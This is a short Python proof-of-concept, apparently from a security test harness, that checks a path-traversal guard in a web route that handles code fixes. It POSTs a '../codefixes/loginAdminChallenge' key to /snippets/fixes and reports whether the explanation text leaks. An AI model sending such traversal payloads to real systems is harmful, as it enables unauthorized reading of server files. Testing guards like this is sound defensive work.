"""Path building from req.body.key in routes/vulnCodeFixes.ts (checkCorrectFix).

The .info.yml path is built from key, but readFixes(key) must first match an
existing codefix file prefix, so a traversal key returns 404 before the fs
access (guard). Ablation removes that guard: a "../codefixes/<challenge>" key
then reaches fs and the explanation read from the traversed file is returned.
"""

import json
import urllib.error
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    body = json.dumps({"key": "../codefixes/loginAdminChallenge", "selectedFix": 0}).encode()
    req = urllib.request.Request(f"{base}/snippets/fixes", data=body,
                                 headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req) as res:
            expl = json.load(res).get("explanation") or ""
        return "doomed to fail" in expl, f"explanation {'leaked' if expl else 'absent'}"
    except urllib.error.HTTPError as err:
        return False, f"HTTP {err.code}"
